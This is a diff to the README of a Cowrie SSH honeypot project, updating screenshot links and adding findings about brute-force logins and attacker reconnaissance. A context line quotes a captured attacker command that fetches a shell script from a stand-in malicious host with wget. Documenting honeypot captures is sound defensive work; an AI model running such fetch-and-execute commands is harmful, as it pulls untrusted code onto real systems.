@@ -59,14 +59,18 @@ Screenshots of attack sessions and logs are included in the `screenshots/` folde
 
 ## 📸 Attack Simulation Screenshots
 
+## 📸 Attack Simulation Screenshots
+
 ### 🔐 SSH Login Attempt
-![SSH Login](screenshots/attack.png)
+![SSH Login](screenshots/attack-sessions/Screenshot-2026-03-31-003934.jpg)
 
 ### 💻 Commands Executed by Attacker
-![Commands](screenshots/commands.png)
+![Commands](screenshots/honeypot/Attacket_cmds.png)
 
 ### 📜 Honeypot Logs Captured
-![Logs](screenshots/logs.png)
+![Logs 1](screenshots/honeypot/Screenshot-2026-03-31-003707.jpg)
+
+![Logs 2](screenshots/honeypot/Screenshot-2026-03-31-003810.jpg)
 ## 🧠 Findings
 
 * Weak passwords are highly targeted
@@ -90,9 +94,17 @@ CMD: wget http://malicious.com/file.sh
 - Automated scripts try to download malicious files
 - Honeypot successfully captures full session activity
 
-## 🚀 Conclusion
+## 🧠 Key Insights
 
+- Weak passwords are heavily targeted
+- Attackers perform reconnaissance immediately
+- Automated scripts attempt login brute force
+
+## 🚀 Conclusion
 The Cowrie honeypot successfully captured attacker behavior and demonstrated how honeypots can be used for threat intelligence and monitoring.
+
+## 🚀 Real-World Impact
+This project demonstrates how honeypots can be used for threat intelligence and early attack detection in cybersecurity environments.
 
 ## 🛠️ Tools Used
 
